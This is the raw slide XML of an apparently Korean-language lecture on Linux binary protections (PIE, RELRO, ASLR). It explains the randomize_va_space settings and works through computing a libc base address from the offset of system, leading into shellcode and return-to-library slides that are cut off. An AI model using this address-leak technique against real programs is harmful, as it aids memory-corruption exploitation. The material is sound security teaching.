              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>비활성화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4F8D0F-86F0-55F9-8BEF-746E27686A5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8441448" y="2564602"/>
            <a:ext cx="1071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NX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>활성화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29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4B902-CD63-F6E8-FF81-444F64A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4C8AE45-BCEF-39D9-E458-2DAEBBBF6DD4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C4DD1-6056-B9CC-8982-CE225B3B2E38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="2577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보호기법 </a:t>
            </a:r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PIE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8FA93D-F7FF-35CA-1B4F-98E35A2BA5BB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CE56F2-A152-404B-5CA1-CBD88941C448}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1289876"/>
            <a:ext cx="116680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PIE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법은 프로그램 실행 시 프로그램의 영역의 주소만 랜덤화해주는 기능입니다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실행파일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라이브러리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스택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힙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 메모리를 랜덤화해주는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ASLR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법과 같이 사용되어야 랜덤화가 이루어집니다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C11EF27-D0A6-9150-CDD3-B74F24F89EE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="455261" y="2429105"/>
            <a:ext cx="5640739" cy="2139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</a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -o pie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pie.c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fpie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -pie 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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p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int main() {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        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("main </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> address : %p\n", (void*)main);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        return 0;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}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EF56C1F-97F8-9AAB-8CB8-FA3971E74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030" y="2419600"/>
            <a:ext cx="4728029" cy="214410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F1C065D-339F-27F2-BA59-2737F123A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58" y="5112323"/>
            <a:ext cx="2906568" cy="8268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473EAD-E688-E304-C793-0DEA4052CE67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1879516" y="4646990"/>
            <a:ext cx="1117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PIE &amp; ASLR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2BB31D8-DEDB-D983-8758-BEB7AAC52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547" y="5112323"/>
            <a:ext cx="3073082" cy="82686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EE4FD1-A16B-CE4D-1BBC-85F551D58F01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5448240" y="4646990"/>
            <a:ext cx="434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PIE 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CB3F5AC-FB8B-519C-EF7B-F0F7BAF56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450" y="5112306"/>
            <a:ext cx="3073082" cy="8410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4EA5CE3-074F-B4BE-CE27-C9CB0A248FCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9173961" y="4684279"/>
            <a:ext cx="582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ASLR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="245496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16EA6-7E00-D9EC-3B30-78330991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0711267-16F5-B528-C345-08E94A4109A6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10122-BC08-DA0D-AD96-F3534EA2B0BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3140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보호기법 </a:t>
            </a:r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RELRO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98124F-D724-70E3-E9F8-5E94EF4FD360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07697D-502B-B5A4-69B4-3D70BA79F6B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="1166803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RELRO </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법은 라이브러리의 실제 함수 주소가 적힌 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GOT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역을 변조하는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GOT overwrite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>공격을 방지하기 위해 개발된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보호기법입니다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.BSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역을 제외한 모든 부분에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>write </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>권한을 부여하지 않기 때문에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GOT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역 변조가 불가능 해집니다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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, GOT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 에는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프로그램 도중에 주소가 쓰이는 방식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(lazy binding)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이 아니라 첫 호출때도 미리 주소가 쓰여 있어 외부 함수를 바로 호출할 수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5674C97-C81B-ED55-E337-2EF0D49DF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2988218"/>
            <a:ext cx="5036713" cy="15269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2E5F28E-FAA8-FF4F-385C-53A7E72E5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661" y="2988218"/>
            <a:ext cx="6427259" cy="152699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EEA983F-1BCA-67C4-60E7-EE30AB109F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364"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="5334120"/>
            <a:ext cx="4727303" cy="8001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E6397F-DB79-031A-41CD-8DC65BF05484}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1698473" y="2594719"/>
            <a:ext cx="1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printf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 첫 호출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E3A10F-78BE-33EC-20AF-E973E98FBC26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8118323" y="2608835"/>
            <a:ext cx="1844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라이브러리로 바로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jmp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F09244-4725-E793-46AF-AA8EF0C72B3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1698473" y="5021712"/>
            <a:ext cx="2068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got</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 미리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적혀있는</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 주소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E04AE10-DD82-A63D-28DC-01445C084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661" y="5324165"/>
            <a:ext cx="5829300" cy="9810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520021C-019D-6D6F-3EC1-04A6D8410450}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7512989" y="4952043"/>
            <a:ext cx="2068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got </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>write </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>권한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미존재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4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94C7-3FB8-9938-DEC6-B3ABEA463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79374D2-B367-D195-79D1-0F8AE41B427C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B1787-EE14-9CED-11DF-2C799785294D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="2880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보호기법 </a:t>
            </a:r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ASLR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503D5B-A4C0-7349-0D67-48CF2286C494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3D9E3D-F53C-7172-5E14-FC2CADCB144B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="1166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ASLR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법은 커널에서 지원하는 보호기법으로 실행파일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라이브러리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스택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힙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 영역의 주소를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랜덤화시켜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 배치합니다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C3E13-ECED-B91E-5FB0-0F0ABE587EC7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1932933"/>
            <a:ext cx="1166803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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/proc/sys/kernel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>randomization_va_space</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1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파일에서 설정 값을 확인할 수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/>
              <a:t>randomize_va_space</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t>=0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>이면 모든 영역 주소 고정</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/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/>
              <a:t>randomize_va_space</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t>=1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>이면 프로그램의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t>.text </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>섹션 및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 고정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ko-KR" sz="1400" dirty="0" err="1"/>
              <a:t>randomize_va_space</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t>=2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>이면 모든 영역 랜덤화</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR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8B49CF6-382D-4D81-203D-87C59532D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91" y="3622803"/>
            <a:ext cx="4400550" cy="12763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B7D8154-0546-C59B-AD48-A06522D89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38" y="3912387"/>
            <a:ext cx="4476750" cy="74295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79F9501-BAC8-BE0B-10E7-1FBA9F06A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38" y="5219019"/>
            <a:ext cx="4514850" cy="12096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F6CF7B9-A448-D6F9-0551-E6B5FA520B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516" y="5142819"/>
            <a:ext cx="4505325" cy="12858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6780B8B-CDFE-E40D-9155-B8D04E043DAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2202571" y="3529149"/>
            <a:ext cx="1319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dirty="0" err="1"/>
              <a:t>aslr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>활성화</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-K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6EDE75-C69E-17AE-565B-12766BE7CEE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2183521" y="4825645"/>
            <a:ext cx="13199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dirty="0" err="1"/>
              <a:t>aslr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>비활성화</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="그래픽 27" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{177E2CED-CF5D-39ED-57F2-A408B91050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50806" y="3826662"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="29" name="그래픽 28" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3763BC18-6200-AE74-9E62-42F53CD336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0052" y="53666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3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494A-D959-CC1A-C7A9-EEAC7EE1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CAC333-2A6F-2B08-AF96-BD309F41A9EF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6EA12-866E-8559-CDA6-CB03761469D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="28809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보호기법 </a:t>
            </a:r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ASLR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05A728-0318-DC5D-CA88-2AD0FD0CC7A1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3,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E10B61-6788-152B-FA38-1F6F66B3BCF7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="116680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ASLR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 은 랜덤화를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할때</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 페이지 단위</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(0x1000)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 정렬하기 때문에 하위 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>비트가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>인 값을 더해주어 랜덤화를 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ex) 0x7ffd83d9f000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라이브러리 파일의 특정 함수 오프셋과 런타임 동안의 함수 주소의 차이 값은 항상 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“xxxxxxx000”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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984BB82-D26C-FBEC-01B6-B67270342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80" y="2213638"/>
            <a:ext cx="5706020" cy="8082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C88B795-9A17-501C-EE00-7A8155331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80" y="3207396"/>
            <a:ext cx="5706020" cy="20133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6FFD9D-262D-49E7-223F-E7B93CCC7BE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6822480" y="2463892"/>
            <a:ext cx="3749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라이브러리의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system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함수의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>offset = 0x528f0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C9AF3B-36AD-BC96-BBBC-91B7345F25E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6822480" y="3875534"/>
            <a:ext cx="374972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프로그램 런타임 중 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system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함수의 실제 주소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0x7ffff7e098f0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E145FB-2819-D53A-4BDB-96FCBCAC1719}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6822480" y="5687610"/>
            <a:ext cx="374972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해당 라이브러리의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libc_base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주소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0x7ffff7e098f0 – 0x528f0 = 0x7ffff7db7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>000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FAC451F-9D6E-B7BE-2301-4312D2376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22" y="5416564"/>
            <a:ext cx="559117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5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44CA6-7E22-3978-EE7D-EA28F229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C071A1-F532-8B58-B266-B66CEC209B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4720" y="0"/>
            <a:ext cx="871728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94EA51-9569-4715-228A-07111FB61F1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D102A-DEB1-5E42-02A9-B9EC86D4E24B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1763036" y="3121223"/>
            <a:ext cx="3123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Shellcode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5DC277-A407-4B39-7A72-254EA270F014}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="3121223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4,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867782F-280D-218A-88BE-4A4C3BFAD3DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="282313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5801455-6A33-2F1A-6759-DC345F0324E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240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34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70FE-FB65-B73C-D9AA-14C6A822F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DE9D203-5829-B9AB-02FE-F3FE78E33BA6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4F276-9B71-9077-AF27-14FBDAE21D2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3593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Return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
